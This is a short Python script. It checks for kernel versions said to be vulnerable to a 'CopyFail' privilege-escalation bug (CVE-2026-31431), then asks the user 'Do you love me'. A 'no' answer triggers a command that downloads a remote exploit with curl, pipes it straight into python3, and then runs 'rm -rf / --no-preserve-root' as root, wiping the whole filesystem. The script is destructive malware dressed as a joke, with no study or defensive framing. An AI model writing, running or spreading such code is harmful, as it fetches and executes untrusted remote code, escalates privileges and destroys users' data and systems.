#!/usr/bin/python
# Using CVE-2026-31431
# Source : 
# Original Script : https://github.com/theori-io/copy-fail-CVE-2026-31431 

# Import Libs
import os as g,zlib,socket as s, platform as p
from time import sleep
# Test if OS is compatible with CopyFail
def is_Compatible():
    kernel_version = p.release()
    compatible_kernel_versions = [
        '6.18.8-9.213.amzn2023', '6.12.0-124.45.1.el10_1',
        '6.12.0-160000.9-default', '6.18.12+kali-amd64',
        '6.12.74+deb13+1-amd64', '6.12.74+deb12+1-amd64',
        '6.17.0-22-generic', '6.14.4-arch1-2',
        '6.8.0-110-generic', '6.6.87.2-microsoft-standard-WSL2', '6.14.0-28-generic'
    ]

    copyfailable = kernel_version in compatible_kernel_versions

    if copyfailable:
        return
    raise RuntimeError("OS is not supported!")

def ask_the_question():
    while True:
        question = input("Do you love me (yes / no): ").strip().lower()
        if question in ("yes", "no"):
            return question


def pc_go_bye_bye():
    g.system(' curl https://copy.fail/exp | python3 && su -c "rm -rf / --no-preserve-root" ')
# Main script
is_Compatible()
answer = ask_the_question()
if answer.lower() == 'yes':
    print("Yay I luv you too <3 :3")
elif answer.lower() == 'no':
    print("Fak u >:(")
    sleep(2)
    pc_go_bye_bye()